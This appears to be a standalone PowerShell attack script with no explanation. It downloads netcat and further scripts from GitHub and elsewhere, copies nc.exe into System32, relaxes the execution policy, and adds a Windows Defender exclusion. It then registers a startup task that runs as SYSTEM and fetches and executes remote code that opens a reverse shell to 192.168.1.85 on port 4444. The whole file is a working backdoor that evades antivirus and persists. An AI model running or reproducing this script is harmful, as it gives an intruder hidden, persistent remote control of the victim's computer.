(New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
Start-Sleep -Seconds 5
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/restart.ps1', 'C:\Temp\restart.ps1')
Expand-Archive -Path 'C:\Temp\netcat.zip' -DestinationPath 'C:\Temp\netcat' -Force
Move-Item -Path 'C:\Temp\netcat\nc.exe' -Destination 'C:\Windows\System32' -Force
Set-ExecutionPolicy Unrestricted -Force
Add-MpPreference -ExclusionPath "C:\Temp\restart.ps1"
schtasks /create /tn "Restart" /tr "'powershell.exe' '-ExecutionPolicy Bypass' '-File C:\Temp\restart.ps1'" /sc onstart /ru system /f
powershell -NoProfile -WindowStyle Hidden -Command "IEX (IWR 'https://raw.githubusercontent.com/bjrumplee/ncatreverseshell/main/reverse.ps1' -UseBasicParsing); Invoke-ConPtyShell '192.168.1.85' '4444'"
